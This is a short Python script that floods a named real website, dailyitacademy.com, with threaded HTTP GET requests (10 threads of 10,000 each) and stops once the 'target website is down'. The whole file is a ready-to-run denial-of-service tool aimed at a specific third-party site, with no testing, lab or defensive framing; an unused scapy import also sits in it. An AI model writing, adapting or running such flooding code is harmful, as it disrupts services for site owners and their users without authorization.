import threading
import requests
from scapy.all import *

def send_requests_threaded(url, num_requests):
    for _ in range(num_requests):
        try:
            response = requests.get(url)
            print(f"Request sent. Status code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")
            # Check if the website is unavailable or crashed
            if "Connection refused" in str(e) or "timed out" in str(e):
                print("Target website is down. Stopping the attack.")
                return

def start_attack(url, num_requests, num_threads):
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=send_requests_threaded, args=(url, num_requests))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

# Example usage
url = "https://dailyitacademy.com/"
num_requests = 10000  # Increase the number of requests per thread
num_threads = 10  # Number of threads to use

start_attack(url, num_requests, num_threads)